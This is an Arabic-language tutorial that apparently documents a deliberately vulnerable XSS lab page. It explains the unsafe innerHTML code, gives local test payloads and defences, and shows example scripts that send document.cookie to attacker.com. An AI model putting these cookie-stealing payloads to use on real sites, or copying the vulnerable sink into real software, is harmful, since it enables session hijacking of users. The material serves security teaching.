# 🎯 ثغرة XSS (Cross-Site Scripting) - index3.html

## 📋 نظرة عامة

هذه الصفحة تحتوي على ثغرة XSS واضحة ومباشرة. الصفحة مصممة لتوضيح كيفية عدم تطبيق ممارسات الأمان الأساسية في معالجة المدخلات.

## 🔍 شرح مفصل للكود

### 📄 هيكل HTML الأساسي
```html
<!DOCTYPE html>
<html>
<head>
    <title>Vulnerable XSS</title>
</head>
<body>
  <h1>Search Page</h1>
```

**شرح كل سطر:**
- **<!DOCTYPE html>**: إعلان نوع المستند HTML5
- **<html>**: بداية عنصر HTML الجذر
- **<head>**: قسم رأس الصفحة
- **<title>Vulnerable XSS</title>**: عنوان الصفحة
- **<body>**: بداية جسم الصفحة
- **<h1>Search Page</h1>**: عنوان رئيسي للصفحة

### 🔍 نموذج البحث
```html
<form method="GET">
  <input type="text" name="q" placeholder="Search...">
  <button type="submit">Submit</button>
</form>
```

**شرح كل سطر:**
- **<form method="GET">**: نموذج يرسل البيانات عبر طريقة GET
- **<input type="text" name="q" placeholder="Search...">**: حقل إدخال نصي
  - **type="text"**: نوع الحقل نصي
  - **name="q"**: اسم المعامل في URL
  - **placeholder="Search..."**: نص توضيحي داخل الحقل
- **<button type="submit">Submit</button>**: زر إرسال النموذج

### 🎯 عرض النتائج
```html
<p>Results for:
  <span id="result"></span>
</p>
```

**شرح كل سطر:**
- **<p>Results for:</p>**: فقرة لعرض النتائج
- **<span id="result"></span>**: عنصر span لتحديد مكان عرض النتائج
- **id="result"**: معرف فريد للعنصر

### ⚠️ الكود الضعيف (الثغرة)
```html
<script>
  const q = new URLSearchParams(window.location.search).get("q");
  if (q) {
    document.getElementById("result").innerHTML = q;
  }
</script>
```

**شرح كل سطر:**
- **<script>**: بداية كود JavaScript
- **const q = new URLSearchParams(window.location.search).get("q")**: 
  - **window.location.search**: الحصول على معاملات URL
  - **new URLSearchParams()**: إنشاء كائن لتحليل المعاملات
  - **.get("q")**: الحصول على قيمة المعامل "q"
- **if (q)**: التحقق من وجود قيمة للمعامل
- **document.getElementById("result").innerHTML = q**: إدراج القيمة مباشرة في HTML

## 🚀 كيفية التنفيذ

### 1. تشغيل الخادم المحلي
```bash
cd html/
python3 -m http.server 8000
```

### 2. فتح المتصفح
```
http://localhost:8000/index3.html
```

### 3. اختبار الثغرة

#### اختبار أساسي:
```
http://localhost:8000/index3.html?q=Hello World
```

#### اختبار XSS بسيط:
```
http://localhost:8000/index3.html?q=<script>alert('XSS')</script>
```

#### اختبار XSS متقدم:
```
http://localhost:8000/index3.html?q=<img src=x onerror=alert('XSS')>
```

## ⚠️ الثغرات في الكود

### 1. استخدام innerHTML
```javascript
// الكود الحالي - غير آمن
document.getElementById("result").innerHTML = q;

// المشكلة: يسمح بتنفيذ HTML و JavaScript
```

### 2. عدم وجود Input Validation
```javascript
// لا يوجد تحقق من نوع البيانات
// لا يوجد تنظيف للمدخلات
// لا يوجد تشفير للمخرجات
```

### 3. عدم وجود Output Encoding
```javascript
// القيم تُدرج مباشرة بدون تشفير
// يسمح بتنفيذ كود ضار
```

## 🛡️ طرق الحماية

### 1. استخدام textContent بدلاً من innerHTML
```javascript
// الكود الآمن
const q = new URLSearchParams(window.location.search).get("q");
if (q) {
    document.getElementById("result").textContent = q;
}
```

### 2. تطبيق Input Validation
```javascript
// التحقق من المدخلات
function validateInput(input) {
    // إزالة الأحرف الخطرة
    return input.replace(/[<>]/g, '');
}

const q = new URLSearchParams(window.location.search).get("q");
if (q) {
    const sanitizedQ = validateInput(q);
    document.getElementById("result").textContent = sanitizedQ;
}
```

### 3. تطبيق Output Encoding
```javascript
// تشفير المخرجات
function encodeHTML(text) {
    return text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
}

const q = new URLSearchParams(window.location.search).get("q");
if (q) {
    const encodedQ = encodeHTML(q);
    document.getElementById("result").innerHTML = encodedQ;
}
```

### 4. استخدام Content Security Policy (CSP)
```html
<head>
    <title>Vulnerable XSS</title>
    <meta http-equiv="Content-Security-Policy" 
          content="default-src 'self'; script-src 'self'">
</head>
```

### 5. تطبيق HttpOnly Cookies
```javascript
// في الخادم
document.cookie = "session=value; HttpOnly; Secure";
```

## 🔍 أنواع هجمات XSS

### 1. Reflected XSS (المستخدم في هذه الصفحة)
```javascript
// المهاجم يرسل رابط ضار
http://example.com/search?q=<script>alert('XSS')</script>

// الضحية ينقر على الرابط
// الكود الضار ينفذ في متصفح الضحية
```

### 2. Stored XSS
```javascript
// المهاجم يحفظ كود ضار في قاعدة البيانات
// الكود ينفذ لكل مستخدم يزور الصفحة
```

### 3. DOM-based XSS
```javascript
// الكود الضار ينفذ في DOM
// لا يمر عبر الخادم
```

## 📊 أمثلة على الاستغلال

### 1. سرقة الكوكيز
```javascript
// كود ضار لسرقة الكوكيز
<script>
var img = new Image();
img.src = "http://attacker.com/steal?cookie=" + document.cookie;
</script>
```

### 2. سرقة الجلسات
```javascript
// كود ضار لسرقة الجلسة
<script>
fetch('http://attacker.com/steal', {
    method: 'POST',
    body: document.cookie
});
</script>
```

### 3. إعادة توجيه
```javascript
// كود ضار لإعادة التوجيه
<script>
window.location.href = "http://attacker.com/steal";
</script>
```

### 4. تعديل الصفحة
```javascript
// كود ضار لتعديل محتوى الصفحة
<script>
document.body.innerHTML = "<h1>Hacked!</h1>";
</script>
```

## 🔍 اكتشاف ثغرات XSS

### 1. الفحص اليدوي
```javascript
// اختبار المدخلات
const testPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    'javascript:alert("XSS")'
];

testPayloads.forEach(payload => {
    // إدراج في حقل البحث
    console.log('Testing:', payload);
});
```

### 2. أدوات الفحص التلقائي
```bash
# استخدام OWASP ZAP
zap-cli quick-scan --self-contained http://localhost:8000

# استخدام Burp Suite
# إدراج payloads في Burp Intruder
```

### 3. مراقبة السجلات
```bash
# مراقبة سجلات الخادم
tail -f /var/log/apache2/access.log | grep -i script

# مراقبة سجلات الأخطاء
tail -f /var/log/apache2/error.log
```

## 📊 تأثير ثغرات XSS

### 1. سرقة البيانات
- الكوكيز
- الجلسات
- البيانات الشخصية
- كلمات المرور

### 2. تعديل المحتوى
- تغيير النصوص
- إضافة روابط ضارة
- تعديل النماذج

### 3. إعادة التوجيه
- توجيه لمواقع مزيفة
- سرقة بيانات تسجيل الدخول
- التصيد الاحتيالي

### 4. تنفيذ كود ضار
- تحميل برامج ضارة
- تعديل إعدادات المتصفح
- سرقة المفاتيح

## ⚖️ الجوانب القانونية

- استخدام XSS ضد مواقع أخرى غير قانوني
- استخدم فقط على أنظمة خاصة بك
- احصل على إذن مكتوب قبل الاختبار
- قد تؤدي إلى عواقب قانونية خطيرة

## 🛡️ أفضل الممارسات

### 1. للدفاع
- تطبيق Input Validation
- استخدام Output Encoding
- تطبيق Content Security Policy
- استخدام HttpOnly Cookies
- مراقبة السجلات بانتظام

### 2. للاختبار
- احصل على إذن مكتوب
- استخدم بيئة معزولة
- وثق جميع الأنشطة
- احترم حدود الاختبار

### 3. للتعلم
- فهم أنواع XSS المختلفة
- تعلم طرق الحماية
- ممارسة في بيئة آمنة
- متابعة آخر التحديثات الأمنية 